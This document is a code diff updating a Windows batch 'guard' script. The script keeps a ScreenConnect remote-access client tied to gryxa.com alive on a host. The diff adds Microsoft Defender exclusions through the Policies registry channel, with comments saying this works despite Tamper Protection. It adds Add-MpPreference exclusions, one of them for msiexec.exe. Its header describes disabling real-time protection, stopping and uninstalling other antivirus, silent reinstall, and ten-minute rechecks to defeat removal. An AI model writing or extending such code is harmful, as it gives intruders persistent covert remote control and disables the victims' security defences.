@@ -1,13 +1,19 @@
 @echo off
-rem WINRTCS_GUARD 0.0.3 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
+rem WINRTCS_GUARD 0.0.4 - recurring gryxa health (agent-launched ~3h). FP-agnostic: gryxa = any
 rem ScreenConnect Client service whose ImagePath contains gryxa.com. Keepers (sevrz) never match.
 rem Ladder: start -> restart -> reinstall (UI MSI -> repo fallback).
 rem 0.0.2: fight-back escalation, evidence-driven via fight.cnt streak (resets only on clean run):
 rem   streak>=2 -> counter Defender (RTM/behavior/IOAV off + policy pins) + stop/disable 3rd-party AV
 rem   streak>=3 -> uninstall the interfering product (once per day, msiexec-quiet or silent flags)
-rem 0.0.3: install preconditioning from proven clean-install (kill svc -> msiexec /x shared PC ->
-rem   purge phantom Installer keys -> orphan/gryxa dir sweep) + one retry; counter reset moved here
-rem   from the agent gate so a lock-busy guard retries next tick instead of waiting 3h.
+rem 0.0.3: install preconditioning (kill svc -> msiexec /x shared PC -> purge phantom Installer keys
+rem   -> orphan/gryxa dir sweep) + one retry; counter reset moved here from the agent gate.
+rem 0.0.4: shields that actually land BEFORE install - literal gryxa dir exclusions via Policies
+rem   channel (Tamper-Protection-safe, wildcards don't work in ExclusionPath) + bounded async
+rem   Add-MpPreference (60s cap, then proceed); post-install re-shield of the REAL ImagePath dir;
+rem   FAIL_svc_not_running / FAIL_msiexec / no_session now bump the streak (0.0.3 looped at 0);
+rem   fast-recheck cadence (guard.cnt=170, ~10 min) after any install/recovery so a client killed
+rem   right after verify is caught in minutes, not 3h; W-wait reset fix for install retries;
+rem   install cap (2 per run) so fight->install can't loop forever inside one run.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CURL=%SystemRoot%\System32\curl.exe"
@@ -17,6 +23,8 @@ set "LOG=%ZD%\guard.log"
 set "STREAKF=%ZD%\fight.cnt"
 set "PRESENT=%ZD%\gryxa_present.flag"
 set "LOCK=%ZD%\guard.lock"
+set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
+set "GDIR64=C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
 if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
 
 rem --- overlap lock: skip if another guard is mid-run; break lock if stale (>15 min) ---
@@ -27,15 +35,14 @@ if errorlevel 1 (
 
 rem --- gate owns the cadence; we own the reset (lock-busy above leaves counter high -> retry next tick) ---
 echo 0>"%ZD%\guard.cnt"
+set "RI=0"
 
 if exist "%LOG%" for %%L in ("%LOG%") do if %%~zL GTR 204800 move /y "%LOG%" "%LOG%.old" >nul 2>&1
 set "STREAK=0"
 if exist "%STREAKF%" set /p "STREAK=" <"%STREAKF%"
 echo [%DATE% %TIME%] guard_begin host=%COMPUTERNAME% streak=!STREAK!>>"%LOG%"
 
-rem --- AV shields: sync reg pin (instant, no Defender service call) + async MpPreference for the rest ---
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Program Files (x86)\ScreenConnect Client (*)" /t REG_DWORD /d 0 /f >nul 2>&1
-start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\ScreenConnect Client (*)'; Get-ChildItem 'C:\Program Files (x86)' -Directory -Filter 'ScreenConnect Client (*)' | ForEach-Object { Add-MpPreference -ExclusionPath $_.FullName; $exe = Join-Path $_.FullName 'ScreenConnect.ClientService.exe'; if (Test-Path $exe) { Add-MpPreference -ExclusionProcess $exe } }" >nul 2>&1
+call :Shields
 
 call :Detect
 if not defined GSVC (
@@ -54,6 +61,7 @@ if errorlevel 1 (
     echo [%DATE% %TIME%] start_fail streak=!STREAK!>>"%LOG%"
     goto :FightThenInstall
   )
+  echo 170>"%ZD%\guard.cnt"
 )
 
 call :Session
@@ -66,7 +74,7 @@ timeout /t 4 /nobreak >nul 2>&1
 sc start "!GSVC!" >nul 2>&1
 timeout /t 15 /nobreak >nul 2>&1
 call :Session
-if defined GUP goto :Healthy
+if defined GUP ( echo 170>"%ZD%\guard.cnt" & goto :Healthy )
 set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
 echo [%DATE% %TIME%] zombie_persist streak=!STREAK!>>"%LOG%"
 goto :FightThenInstall
@@ -100,6 +108,8 @@ if exist "%ZD%\war.out" ( type "%ZD%\war.out">> "%LOG%" )
 exit /b 0
 
 :Install
+set /a RI+=1
+if !RI! GTR 2 ( echo [%DATE% %TIME%] FAIL_install_cap>>"%LOG%" & echo 170>"%ZD%\guard.cnt" & goto :Done )
 set "MSI=%ZD%\gryxa_install.msi"
 set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
 set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
@@ -124,8 +134,6 @@ for /d %%D in ("%ProgramFiles(x86)%\ScreenConnect Client (*)") do (
 )
 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 
 set "SRC=ui"
 del /f /q "%MSI%" >nul 2>&1
@@ -150,9 +158,9 @@ echo [%DATE% %TIME%] msi_install src=!SRC! attempt=!ATTEMPT!>>"%LOG%"
 msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v "%ZD%\msi_gryxa_install.log" >nul 2>&1
 set "MSIEXIT=!ERRORLEVEL!"
 echo [%DATE% %TIME%] msiexec_exit=!MSIEXIT! attempt=!ATTEMPT!>>"%LOG%"
-if "!MSIEXIT!"=="0" goto :WaitSvc
-if "!MSIEXIT!"=="3010" goto :WaitSvc
-if !ATTEMPT! GEQ 2 ( echo [%DATE% %TIME%] FAIL_msiexec_!MSIEXIT!>>"%LOG%" & goto :Done )
+if "!MSIEXIT!"=="0" goto :WaitSvc0
+if "!MSIEXIT!"=="3010" goto :WaitSvc0
+if !ATTEMPT! GEQ 2 ( set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%" & echo [%DATE% %TIME%] FAIL_msiexec_!MSIEXIT! streak=!STREAK!>>"%LOG%" & echo 170>"%ZD%\guard.cnt" & goto :Done )
 msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >nul 2>&1
 call :PurgePhantom
 timeout /t 5 /nobreak >nul 2>&1
@@ -166,6 +174,7 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >n
 reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
 exit /b 0
 
+:WaitSvc0
 set "W=0"
 :WaitSvc
 timeout /t 5 /nobreak >nul 2>&1
@@ -176,13 +185,28 @@ if defined GSVC (
 )
 set /a W+=1
 if !W! LSS 12 goto :WaitSvc
-echo [%DATE% %TIME%] FAIL_svc_not_running>>"%LOG%"
-goto :Done
+set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
+echo [%DATE% %TIME%] FAIL_svc_not_running streak=!STREAK!>>"%LOG%"
+goto :FightThenInstall
 
 :SvcUp
 sc config "!GSVC!" start= auto >nul 2>&1
 sc failure "!GSVC!" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
 sc start "!GSVC!" >nul 2>&1
+
+rem --- post-install re-shield: the real install dir exists now, pin it by ImagePath ---
+set "SHDIR="
+for /f "tokens=2,*" %%A in ('reg query "HKLM\SYSTEM\CurrentControlSet\Services\!GSVC!" /v ImagePath 2^>nul ^| findstr /I "ImagePath"') do set "SHIMG=%%B"
+if defined SHIMG (
+  set "SHIMG=!SHIMG:"=!"
+  for %%P in ("!SHIMG!") do set "SHDIR=%%~dpP"
+  if defined SHDIR (
+    set "SHDIR=!SHDIR:~0,-1!"
+    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "!SHDIR!" /t REG_DWORD /d 0 /f >nul 2>&1
+    powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; Add-MpPreference -ExclusionPath '!SHDIR!'" >nul 2>&1
+    echo [%DATE% %TIME%] resheilded !SHDIR!>>"%LOG%"
+  )
+)
 
 :WaitSession
 set "W=0"
@@ -191,13 +215,16 @@ timeout /t 5 /nobreak >nul 2>&1
 call :Session
 if defined GUP (
   echo %DATE% %TIME%>"%PRESENT%"
-  echo [%DATE% %TIME%] installed_verified !GSVC! src=!SRC!>>"%LOG%"
+  echo [%DATE% %TIME%] installed_verified !GSVC! src=!SRC! recheck=10m>>"%LOG%"
+  echo 170>"%ZD%\guard.cnt"
   del /f /q "%MSI%" >nul 2>&1
   goto :Done
 )
 set /a W+=1
 if !W! LSS 6 goto :WaitSess
-echo [%DATE% %TIME%] installed_no_session_yet !GSVC! src=!SRC!>>"%LOG%"
+set /a "STREAK+=1" & echo !STREAK!>"%STREAKF%"
+echo [%DATE% %TIME%] installed_no_session_yet !GSVC! src=!SRC! streak=!STREAK! recheck=10m>>"%LOG%"
+echo 170>"%ZD%\guard.cnt"
 del /f /q "%MSI%" >nul 2>&1
 goto :Done
 
@@ -220,6 +247,28 @@ if not defined GPID exit /b 0
 if "!GPID!"=="0" exit /b 0
 netstat -ano 2>nul | findstr /C:"ESTABLISHED" | findstr /E /C:" !GPID!" >nul 2>&1
 if not errorlevel 1 set "GUP=1"
+exit /b 0
+
+:Shields
+rem --- channel 1: Policies-key reg pins (instant; GP channel honored even with Tamper Protection) ---
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%GDIR86%" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%GDIR64%" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "%ZD%" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.WindowsClient.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+rem --- channel 2: cmdlet API, bounded (60s cap) so a busy Defender service can't hang the guard ---
+del /f /q "%ZD%\shields.done" >nul 2>&1
+start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $st=Get-MpComputerStatus; $paths=@('%GDIR86%','%GDIR64%','%ZD%'); foreach($root in 'C:\Program Files (x86)','C:\Program Files'){ Get-ChildItem $root -Directory -Filter 'ScreenConnect Client (*)' | ForEach-Object { $paths += $_.FullName } }; foreach($p in ($paths | Select-Object -Unique)){ Add-MpPreference -ExclusionPath $p }; foreach($x in 'ScreenConnect.ClientService.exe','ScreenConnect.WindowsClient.exe','msiexec.exe'){ Add-MpPreference -ExclusionProcess $x }; ('shields_ok rtm=' + $st.RealTimeProtectionEnabled + ' tp=' + $st.IsTamperProtected) | Set-Content -Path '%ZD%\shields.done' -Encoding ASCII" >nul 2>&1
+set "SW=0"
+:ShieldsWait
+if exist "%ZD%\shields.done" goto :ShieldsOut
+timeout /t 5 /nobreak >nul 2>&1
+set /a SW+=1
+if !SW! LSS 12 goto :ShieldsWait
+echo [%DATE% %TIME%] shields_timeout_proceeding>>"%LOG%"
+:ShieldsOut
+if exist "%ZD%\shields.done" ( type "%ZD%\shields.done">>"%LOG%" & del /f /q "%ZD%\shields.done" >nul 2>&1 )
 exit /b 0
 
 :Done
